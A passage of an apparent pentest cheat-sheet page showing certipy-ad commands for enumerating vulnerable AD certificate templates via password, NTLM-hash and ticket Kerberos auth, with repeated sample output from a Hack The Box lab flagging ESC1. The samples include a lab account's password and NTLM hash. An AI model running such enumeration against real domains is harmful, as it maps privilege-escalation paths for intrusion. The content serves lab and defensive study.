</span></span></span><span class="line"><span class="cl"><span class="go">[*] Checking web enrollment for CA 'sequel-DC-CA' @ 'dc.sequel.htb'
</span></span></span><span class="line"><span class="cl"><span class="go">[!] Error checking web enrollment: timed out
</span></span></span><span class="line"><span class="cl"><span class="go">[!] Use -debug to print a stacktrace
</span></span></span><span class="line"><span class="cl"><span class="go">[!] Error checking web enrollment: timed out
</span></span></span><span class="line"><span class="cl"><span class="go">[!] Use -debug to print a stacktrace
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Enumeration output:
</span></span></span><span class="line"><span class="cl"><span class="go">Certificate Authorities
</span></span></span><span class="line"><span class="cl"><span class="go">  0
</span></span></span><span class="line"><span class="cl"><span class="go">    CA Name                             : sequel-DC-CA
</span></span></span><span class="line"><span class="cl"><span class="go">    DNS Name                            : dc.sequel.htb
</span></span></span><span class="line"><span class="cl"><span class="go">    Certificate Subject                 : CN=sequel-DC-CA, DC=sequel, DC=htb
</span></span></span><span class="line"><span class="cl"><span class="go">    Certificate Serial Number           : 1EF2FA9A7E6EADAD4F5382F4CE283101
</span></span></span><span class="line"><span class="cl"><span class="go">    Certificate Validity Start          : 2022-11-18 20:58:46+00:00
</span></span></span><span class="line"><span class="cl"><span class="go">    Certificate Validity End            : 2121-11-18 21:08:46+00:00
</span></span></span><span class="line"><span class="cl"><span class="go">    Web Enrollment
</span></span></span><span class="line"><span class="cl"><span class="go">      HTTP
</span></span></span><span class="line"><span class="cl"><span class="go">        Enabled                         : False
</span></span></span><span class="line"><span class="cl"><span class="go">      HTTPS
</span></span></span><span class="line"><span class="cl"><span class="go">        Enabled                         : False
</span></span></span><span class="line"><span class="cl"><span class="go">    User Specified SAN                  : Disabled
</span></span></span><span class="line"><span class="cl"><span class="go">    Request Disposition                 : Issue
</span></span></span><span class="line"><span class="cl"><span class="go">    Enforce Encryption for Requests     : Enabled
</span></span></span><span class="line"><span class="cl"><span class="go">    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
</span></span></span><span class="line"><span class="cl"><span class="go">    Permissions
</span></span></span><span class="line"><span class="cl"><span class="go">      Owner                             : SEQUEL.HTB\Administrators
</span></span></span><span class="line"><span class="cl"><span class="go">      Access Rights
</span></span></span><span class="line"><span class="cl"><span class="go">        ManageCa                        : SEQUEL.HTB\Administrators
</span></span></span><span class="line"><span class="cl"><span class="go">                                          SEQUEL.HTB\Domain Admins
</span></span></span><span class="line"><span class="cl"><span class="go">                                          SEQUEL.HTB\Enterprise Admins
</span></span></span><span class="line"><span class="cl"><span class="go">        ManageCertificates              : SEQUEL.HTB\Administrators
</span></span></span><span class="line"><span class="cl"><span class="go">                                          SEQUEL.HTB\Domain Admins
</span></span></span><span class="line"><span class="cl"><span class="go">                                          SEQUEL.HTB\Enterprise Admins
</span></span></span><span class="line"><span class="cl"><span class="go">        Enroll                          : SEQUEL.HTB\Authenticated Users
</span></span></span><span class="line"><span class="cl"><span class="go">Certificate Templates
</span></span></span><span class="line"><span class="cl"><span class="go">  0
</span></span></span><span class="line"><span class="cl"><span class="go">    Template Name                       : UserAuthentication
</span></span></span><span class="line"><span class="cl"><span class="go">    Display Name                        : UserAuthentication
</span></span></span><span class="line"><span class="cl"><span class="go">    Certificate Authorities             : sequel-DC-CA
</span></span></span><span class="line"><span class="cl"><span class="go">    Enabled                             : True
</span></span></span><span class="line"><span class="cl"><span class="go">    Client Authentication               : True
</span></span></span><span class="line"><span class="cl"><span class="go">    Enrollment Agent                    : False
</span></span></span><span class="line"><span class="cl"><span class="go">    Any Purpose                         : False
</span></span></span><span class="line"><span class="cl"><span class="go">    Enrollee Supplies Subject           : True
</span></span></span><span class="line"><span class="cl"><span class="go">    Certificate Name Flag               : EnrolleeSuppliesSubject
</span></span></span><span class="line"><span class="cl"><span class="go">    Enrollment Flag                     : IncludeSymmetricAlgorithms
</span></span></span><span class="line"><span class="cl"><span class="go">                                          PublishToDs
</span></span></span><span class="line"><span class="cl"><span class="go">    Private Key Flag                    : ExportableKey
</span></span></span><span class="line"><span class="cl"><span class="go">    Extended Key Usage                  : Client Authentication
</span></span></span><span class="line"><span class="cl"><span class="go">                                          Secure Email
</span></span></span><span class="line"><span class="cl"><span class="go">                                          Encrypting File System
</span></span></span><span class="line"><span class="cl"><span class="go">    Requires Manager Approval           : False
</span></span></span><span class="line"><span class="cl"><span class="go">    Requires Key Archival               : False
</span></span></span><span class="line"><span class="cl"><span class="go">    Authorized Signatures Required      : 0
</span></span></span><span class="line"><span class="cl"><span class="go">    Schema Version                      : 2
</span></span></span><span class="line"><span class="cl"><span class="go">    Validity Period                     : 10 years
</span></span></span><span class="line"><span class="cl"><span class="go">    Renewal Period                      : 6 weeks
</span></span></span><span class="line"><span class="cl"><span class="go">    Minimum RSA Key Length              : 2048
</span></span></span><span class="line"><span class="cl"><span class="go">    Template Created                    : 2022-11-18T21:10:22+00:00
</span></span></span><span class="line"><span class="cl"><span class="go">    Template Last Modified              : 2024-01-19T00:26:38+00:00
</span></span></span><span class="line"><span class="cl"><span class="go">    Permissions
</span></span></span><span class="line"><span class="cl"><span class="go">      Enrollment Permissions
</span></span></span><span class="line"><span class="cl"><span class="go">        Enrollment Rights               : SEQUEL.HTB\Domain Admins
</span></span></span><span class="line"><span class="cl"><span class="go">                                          SEQUEL.HTB\Domain Users
</span></span></span><span class="line"><span class="cl"><span class="go">                                          SEQUEL.HTB\Enterprise Admins
</span></span></span><span class="line"><span class="cl"><span class="go">      Object Control Permissions
</span></span></span><span class="line"><span class="cl"><span class="go">        Owner                           : SEQUEL.HTB\Administrator
</span></span></span><span class="line"><span class="cl"><span class="go">        Full Control Principals         : SEQUEL.HTB\Domain Admins
</span></span></span><span class="line"><span class="cl"><span class="go">                                          SEQUEL.HTB\Enterprise Admins
</span></span></span><span class="line"><span class="cl"><span class="go">        Write Owner Principals          : SEQUEL.HTB\Domain Admins
</span></span></span><span class="line"><span class="cl"><span class="go">                                          SEQUEL.HTB\Enterprise Admins
</span></span></span><span class="line"><span class="cl"><span class="go">        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
</span></span></span><span class="line"><span class="cl"><span class="go">                                          SEQUEL.HTB\Enterprise Admins
</span></span></span><span class="line"><span class="cl"><span class="go">        Write Property Enroll           : SEQUEL.HTB\Domain Admins
</span></span></span><span class="line"><span class="cl"><span class="go">                                          SEQUEL.HTB\Domain Users
</span></span></span><span class="line"><span class="cl"><span class="go">                                          SEQUEL.HTB\Enterprise Admins
</span></span></span><span class="line"><span class="cl"><span class="go">    [+] User Enrollable Principals      : SEQUEL.HTB\Domain Users
</span></span></span><span class="line"><span class="cl"><span class="go">    [!] Vulnerabilities
</span></span></span><span class="line"><span class="cl"><span class="go">      ESC1                              : Enrollee supplies subject and template allows client authentication.
</span></span></span></div></pre></div><div class="highlight password-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad find -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -k -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -text -stdout -vulnerable -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad find -u <span class="s1">'ryan.cooper@sequel.htb'</span> -p <span class="s1">'NuclearMosquito3'</span> -k -target dc.sequel.htb -text -stdout -vulnerable -dc-host dc.sequel.htb -ns 10.129.33.22
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Finding certificate templates
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Found 34 certificate templates
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Finding certificate authorities
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Found 1 certificate authority
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Found 12 enabled certificate templates
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Finding issuance policies
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Found 15 issuance policies
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Found 0 OIDs linked to templates
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Retrieving CA configuration for 'sequel-DC-CA' via RRP
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully retrieved CA configuration for 'sequel-DC-CA'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Checking web enrollment for CA 'sequel-DC-CA' @ 'dc.sequel.htb'
</span></span></span><span class="line"><span class="cl"><span class="go">[!] Error checking web enrollment: timed out
</span></span></span><span class="line"><span class="cl"><span class="go">[!] Use -debug to print a stacktrace
</span></span></span><span class="line"><span class="cl"><span class="go">[!] Error checking web enrollment: timed out
</span></span></span><span class="line"><span class="cl"><span class="go">[!] Use -debug to print a stacktrace
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Enumeration output:
</span></span></span><span class="line"><span class="cl"><span class="go">Certificate Authorities
</span></span></span><span class="line"><span class="cl"><span class="go">  0
</span></span></span><span class="line"><span class="cl"><span class="go">    CA Name                             : sequel-DC-CA
</span></span></span><span class="line"><span class="cl"><span class="go">    DNS Name                            : dc.sequel.htb
</span></span></span><span class="line"><span class="cl"><span class="go">    Certificate Subject                 : CN=sequel-DC-CA, DC=sequel, DC=htb
</span></span></span><span class="line"><span class="cl"><span class="go">    Certificate Serial Number           : 1EF2FA9A7E6EADAD4F5382F4CE283101
</span></span></span><span class="line"><span class="cl"><span class="go">    Certificate Validity Start          : 2022-11-18 20:58:46+00:00
</span></span></span><span class="line"><span class="cl"><span class="go">    Certificate Validity End            : 2121-11-18 21:08:46+00:00
</span></span></span><span class="line"><span class="cl"><span class="go">    Web Enrollment
</span></span></span><span class="line"><span class="cl"><span class="go">      HTTP
</span></span></span><span class="line"><span class="cl"><span class="go">        Enabled                         : False
</span></span></span><span class="line"><span class="cl"><span class="go">      HTTPS
</span></span></span><span class="line"><span class="cl"><span class="go">        Enabled                         : False
</span></span></span><span class="line"><span class="cl"><span class="go">    User Specified SAN                  : Disabled
</span></span></span><span class="line"><span class="cl"><span class="go">    Request Disposition                 : Issue
</span></span></span><span class="line"><span class="cl"><span class="go">    Enforce Encryption for Requests     : Enabled
</span></span></span><span class="line"><span class="cl"><span class="go">    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
</span></span></span><span class="line"><span class="cl"><span class="go">    Permissions
</span></span></span><span class="line"><span class="cl"><span class="go">      Owner                             : SEQUEL.HTB\Administrators
</span></span></span><span class="line"><span class="cl"><span class="go">      Access Rights
</span></span></span><span class="line"><span class="cl"><span class="go">        ManageCa                        : SEQUEL.HTB\Administrators
</span></span></span><span class="line"><span class="cl"><span class="go">                                          SEQUEL.HTB\Domain Admins
</span></span></span><span class="line"><span class="cl"><span class="go">                                          SEQUEL.HTB\Enterprise Admins
</span></span></span><span class="line"><span class="cl"><span class="go">        ManageCertificates              : SEQUEL.HTB\Administrators
</span></span></span><span class="line"><span class="cl"><span class="go">                                          SEQUEL.HTB\Domain Admins
</span></span></span><span class="line"><span class="cl"><span class="go">                                          SEQUEL.HTB\Enterprise Admins
</span></span></span><span class="line"><span class="cl"><span class="go">        Enroll                          : SEQUEL.HTB\Authenticated Users
</span></span></span><span class="line"><span class="cl"><span class="go">Certificate Templates
</span></span></span><span class="line"><span class="cl"><span class="go">  0
</span></span></span><span class="line"><span class="cl"><span class="go">    Template Name                       : UserAuthentication
</span></span></span><span class="line"><span class="cl"><span class="go">    Display Name                        : UserAuthentication
</span></span></span><span class="line"><span class="cl"><span class="go">    Certificate Authorities             : sequel-DC-CA
</span></span></span><span class="line"><span class="cl"><span class="go">    Enabled                             : True
</span></span></span><span class="line"><span class="cl"><span class="go">    Client Authentication               : True
</span></span></span><span class="line"><span class="cl"><span class="go">    Enrollment Agent                    : False
</span></span></span><span class="line"><span class="cl"><span class="go">    Any Purpose                         : False
</span></span></span><span class="line"><span class="cl"><span class="go">    Enrollee Supplies Subject           : True
</span></span></span><span class="line"><span class="cl"><span class="go">    Certificate Name Flag               : EnrolleeSuppliesSubject
</span></span></span><span class="line"><span class="cl"><span class="go">    Enrollment Flag                     : IncludeSymmetricAlgorithms
</span></span></span><span class="line"><span class="cl"><span class="go">                                          PublishToDs
</span></span></span><span class="line"><span class="cl"><span class="go">    Private Key Flag                    : ExportableKey
</span></span></span><span class="line"><span class="cl"><span class="go">    Extended Key Usage                  : Client Authentication
</span></span></span><span class="line"><span class="cl"><span class="go">                                          Secure Email
</span></span></span><span class="line"><span class="cl"><span class="go">                                          Encrypting File System
</span></span></span><span class="line"><span class="cl"><span class="go">    Requires Manager Approval           : False
</span></span></span><span class="line"><span class="cl"><span class="go">    Requires Key Archival               : False
</span></span></span><span class="line"><span class="cl"><span class="go">    Authorized Signatures Required      : 0
</span></span></span><span class="line"><span class="cl"><span class="go">    Schema Version                      : 2
</span></span></span><span class="line"><span class="cl"><span class="go">    Validity Period                     : 10 years
</span></span></span><span class="line"><span class="cl"><span class="go">    Renewal Period                      : 6 weeks
</span></span></span><span class="line"><span class="cl"><span class="go">    Minimum RSA Key Length              : 2048
</span></span></span><span class="line"><span class="cl"><span class="go">    Template Created                    : 2022-11-18T21:10:22+00:00
</span></span></span><span class="line"><span class="cl"><span class="go">    Template Last Modified              : 2024-01-19T00:26:38+00:00
</span></span></span><span class="line"><span class="cl"><span class="go">    Permissions
</span></span></span><span class="line"><span class="cl"><span class="go">      Enrollment Permissions
</span></span></span><span class="line"><span class="cl"><span class="go">        Enrollment Rights               : SEQUEL.HTB\Domain Admins
</span></span></span><span class="line"><span class="cl"><span class="go">                                          SEQUEL.HTB\Domain Users
</span></span></span><span class="line"><span class="cl"><span class="go">                                          SEQUEL.HTB\Enterprise Admins
</span></span></span><span class="line"><span class="cl"><span class="go">      Object Control Permissions
</span></span></span><span class="line"><span class="cl"><span class="go">        Owner                           : SEQUEL.HTB\Administrator
</span></span></span><span class="line"><span class="cl"><span class="go">        Full Control Principals         : SEQUEL.HTB\Domain Admins
</span></span></span><span class="line"><span class="cl"><span class="go">                                          SEQUEL.HTB\Enterprise Admins
</span></span></span><span class="line"><span class="cl"><span class="go">        Write Owner Principals          : SEQUEL.HTB\Domain Admins
</span></span></span><span class="line"><span class="cl"><span class="go">                                          SEQUEL.HTB\Enterprise Admins
</span></span></span><span class="line"><span class="cl"><span class="go">        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
</span></span></span><span class="line"><span class="cl"><span class="go">                                          SEQUEL.HTB\Enterprise Admins
</span></span></span><span class="line"><span class="cl"><span class="go">        Write Property Enroll           : SEQUEL.HTB\Domain Admins
</span></span></span><span class="line"><span class="cl"><span class="go">                                          SEQUEL.HTB\Domain Users
</span></span></span><span class="line"><span class="cl"><span class="go">                                          SEQUEL.HTB\Enterprise Admins
</span></span></span><span class="line"><span class="cl"><span class="go">    [+] User Enrollable Principals      : SEQUEL.HTB\Domain Users
</span></span></span><span class="line"><span class="cl"><span class="go">    [!] Vulnerabilities
</span></span></span><span class="line"><span class="cl"><span class="go">      ESC1                              : Enrollee supplies subject and template allows client authentication.
</span></span></span></div></pre></div><div class="highlight ntlm-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad find -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -hashes '<span class="o editable-keyword">&lt;HASH&gt;</span>' -k -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -text -stdout -vulnerable -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad find -u <span class="s1">'ryan.cooper@sequel.htb'</span> -hashes <span class="s1">'98981eed8e9ce0763bb3c5b3c7ed5945'</span> -k -target dc.sequel.htb -text -stdout -vulnerable -dc-host dc.sequel.htb -ns 10.129.33.22
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[!] KRB5CCNAME environment variable not set
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Finding certificate templates
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Found 34 certificate templates
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Finding certificate authorities
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Found 1 certificate authority
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Found 12 enabled certificate templates
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Finding issuance policies
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Found 15 issuance policies
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Found 0 OIDs linked to templates
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Retrieving CA configuration for 'sequel-DC-CA' via RRP
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully retrieved CA configuration for 'sequel-DC-CA'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Checking web enrollment for CA 'sequel-DC-CA' @ 'dc.sequel.htb'
</span></span></span><span class="line"><span class="cl"><span class="go">[!] Error checking web enrollment: timed out
</span></span></span><span class="line"><span class="cl"><span class="go">[!] Use -debug to print a stacktrace
</span></span></span><span class="line"><span class="cl"><span class="go">[!] Error checking web enrollment: timed out
</span></span></span><span class="line"><span class="cl"><span class="go">[!] Use -debug to print a stacktrace
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Enumeration output:
</span></span></span><span class="line"><span class="cl"><span class="go">Certificate Authorities
</span></span></span><span class="line"><span class="cl"><span class="go">  0
</span></span></span><span class="line"><span class="cl"><span class="go">    CA Name                             : sequel-DC-CA
</span></span></span><span class="line"><span class="cl"><span class="go">    DNS Name                            : dc.sequel.htb
</span></span></span><span class="line"><span class="cl"><span class="go">    Certificate Subject                 : CN=sequel-DC-CA, DC=sequel, DC=htb
</span></span></span><span class="line"><span class="cl"><span class="go">    Certificate Serial Number           : 1EF2FA9A7E6EADAD4F5382F4CE283101
</span></span></span><span class="line"><span class="cl"><span class="go">    Certificate Validity Start          : 2022-11-18 20:58:46+00:00
</span></span></span><span class="line"><span class="cl"><span class="go">    Certificate Validity End            : 2121-11-18 21:08:46+00:00
</span></span></span><span class="line"><span class="cl"><span class="go">    Web Enrollment
</span></span></span><span class="line"><span class="cl"><span class="go">      HTTP
</span></span></span><span class="line"><span class="cl"><span class="go">        Enabled                         : False
</span></span></span><span class="line"><span class="cl"><span class="go">      HTTPS
</span></span></span><span class="line"><span class="cl"><span class="go">        Enabled                         : False
</span></span></span><span class="line"><span class="cl"><span class="go">    User Specified SAN                  : Disabled
</span></span></span><span class="line"><span class="cl"><span class="go">    Request Disposition                 : Issue
</span></span></span><span class="line"><span class="cl"><span class="go">    Enforce Encryption for Requests     : Enabled
</span></span></span><span class="line"><span class="cl"><span class="go">    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
</span></span></span><span class="line"><span class="cl"><span class="go">    Permissions
</span></span></span><span class="line"><span class="cl"><span class="go">      Owner                             : SEQUEL.HTB\Administrators
</span></span></span><span class="line"><span class="cl"><span class="go">      Access Rights
</span></span></span><span class="line"><span class="cl"><span class="go">        ManageCa                        : SEQUEL.HTB\Administrators
</span></span></span><span class="line"><span class="cl"><span class="go">                                          SEQUEL.HTB\Domain Admins
</span></span></span><span class="line"><span class="cl"><span class="go">                                          SEQUEL.HTB\Enterprise Admins
</span></span></span><span class="line"><span class="cl"><span class="go">        ManageCertificates              : SEQUEL.HTB\Administrators
</span></span></span><span class="line"><span class="cl"><span class="go">                                          SEQUEL.HTB\Domain Admins
</span></span></span><span class="line"><span class="cl"><span class="go">                                          SEQUEL.HTB\Enterprise Admins
</span></span></span><span class="line"><span class="cl"><span class="go">        Enroll                          : SEQUEL.HTB\Authenticated Users
</span></span></span><span class="line"><span class="cl"><span class="go">Certificate Templates
</span></span></span><span class="line"><span class="cl"><span class="go">  0
</span></span></span><span class="line"><span class="cl"><span class="go">    Template Name                       : UserAuthentication
</span></span></span><span class="line"><span class="cl"><span class="go">    Display Name                        : UserAuthentication
</span></span></span><span class="line"><span class="cl"><span class="go">    Certificate Authorities             : sequel-DC-CA
</span></span></span><span class="line"><span class="cl"><span class="go">    Enabled                             : True
</span></span></span><span class="line"><span class="cl"><span class="go">    Client Authentication               : True
</span></span></span><span class="line"><span class="cl"><span class="go">    Enrollment Agent                    : False
</span></span></span><span class="line"><span class="cl"><span class="go">    Any Purpose                         : False
</span></span></span><span class="line"><span class="cl"><span class="go">    Enrollee Supplies Subject           : True
</span></span></span><span class="line"><span class="cl"><span class="go">    Certificate Name Flag               : EnrolleeSuppliesSubject
</span></span></span><span class="line"><span class="cl"><span class="go">    Enrollment Flag                     : IncludeSymmetricAlgorithms
</span></span></span><span class="line"><span class="cl"><span class="go">                                          PublishToDs
</span></span></span><span class="line"><span class="cl"><span class="go">    Private Key Flag                    : ExportableKey
</span></span></span><span class="line"><span class="cl"><span class="go">    Extended Key Usage                  : Client Authentication
</span></span></span><span class="line"><span class="cl"><span class="go">                                          Secure Email
</span></span></span><span class="line"><span class="cl"><span class="go">                                          Encrypting File System
</span></span></span><span class="line"><span class="cl"><span class="go">    Requires Manager Approval           : False
</span></span></span><span class="line"><span class="cl"><span class="go">    Requires Key Archival               : False
</span></span></span><span class="line"><span class="cl"><span class="go">    Authorized Signatures Required      : 0
</span></span></span><span class="line"><span class="cl"><span class="go">    Schema Version                      : 2
</span></span></span><span class="line"><span class="cl"><span class="go">    Validity Period                     : 10 years
</span></span></span><span class="line"><span class="cl"><span class="go">    Renewal Period                      : 6 weeks
</span></span></span><span class="line"><span class="cl"><span class="go">    Minimum RSA Key Length              : 2048
</span></span></span><span class="line"><span class="cl"><span class="go">    Template Created                    : 2022-11-18T21:10:22+00:00
</span></span></span><span class="line"><span class="cl"><span class="go">    Template Last Modified              : 2024-01-19T00:26:38+00:00
</span></span></span><span class="line"><span class="cl"><span class="go">    Permissions
</span></span></span><span class="line"><span class="cl"><span class="go">      Enrollment Permissions
</span></span></span><span class="line"><span class="cl"><span class="go">        Enrollment Rights               : SEQUEL.HTB\Domain Admins
</span></span></span><span class="line"><span class="cl"><span class="go">                                          SEQUEL.HTB\Domain Users
</span></span></span><span class="line"><span class="cl"><span class="go">                                          SEQUEL.HTB\Enterprise Admins
</span></span></span><span class="line"><span class="cl"><span class="go">      Object Control Permissions
</span></span></span><span class="line"><span class="cl"><span class="go">        Owner                           : SEQUEL.HTB\Administrator
</span></span></span><span class="line"><span class="cl"><span class="go">        Full Control Principals         : SEQUEL.HTB\Domain Admins
</span></span></span><span class="line"><span class="cl"><span class="go">                                          SEQUEL.HTB\Enterprise Admins
</span></span></span><span class="line"><span class="cl"><span class="go">        Write Owner Principals          : SEQUEL.HTB\Domain Admins
</span></span></span><span class="line"><span class="cl"><span class="go">                                          SEQUEL.HTB\Enterprise Admins
</span></span></span><span class="line"><span class="cl"><span class="go">        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
</span></span></span><span class="line"><span class="cl"><span class="go">                                          SEQUEL.HTB\Enterprise Admins
</span></span></span><span class="line"><span class="cl"><span class="go">        Write Property Enroll           : SEQUEL.HTB\Domain Admins
</span></span></span><span class="line"><span class="cl"><span class="go">                                          SEQUEL.HTB\Domain Users
</span></span></span><span class="line"><span class="cl"><span class="go">                                          SEQUEL.HTB\Enterprise Admins
</span></span></span><span class="line"><span class="cl"><span class="go">    [+] User Enrollable Principals      : SEQUEL.HTB\Domain Users
</span></span></span><span class="line"><span class="cl"><span class="go">    [!] Vulnerabilities
</span></span></span><span class="line"><span class="cl"><span class="go">      ESC1                              : Enrollee supplies subject and template allows client authentication.
</span></span></span></div></pre></div><div class="highlight ticket-based-kerberos codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Ticket-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad find -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -k -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -text -stdout -vulnerable -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ns <span class="o editable-keyword">&lt;DC_IP&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad find -u <span class="s1">'ryan.cooper@sequel.htb'</span> -k -target dc.sequel.htb -text -stdout -vulnerable -dc-host dc.sequel.htb -ns 10.129.33.22                                 
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Finding certificate templates
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Found 34 certificate templates
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Finding certificate authorities
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Found 1 certificate authority
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Found 12 enabled certificate templates
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Finding issuance policies
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Found 15 issuance policies
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Found 0 OIDs linked to templates
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Retrieving CA configuration for 'sequel-DC-CA' via RRP
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully retrieved CA configuration for 'sequel-DC-CA'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Checking web enrollment for CA 'sequel-DC-CA' @ 'dc.sequel.htb'
</span></span></span><span class="line"><span class="cl"><span class="go">[!] Error checking web enrollment: timed out
</span></span></span><span class="line"><span class="cl"><span class="go">[!] Use -debug to print a stacktrace
</span></span></span><span class="line"><span class="cl"><span class="go">[!] Error checking web enrollment: timed out
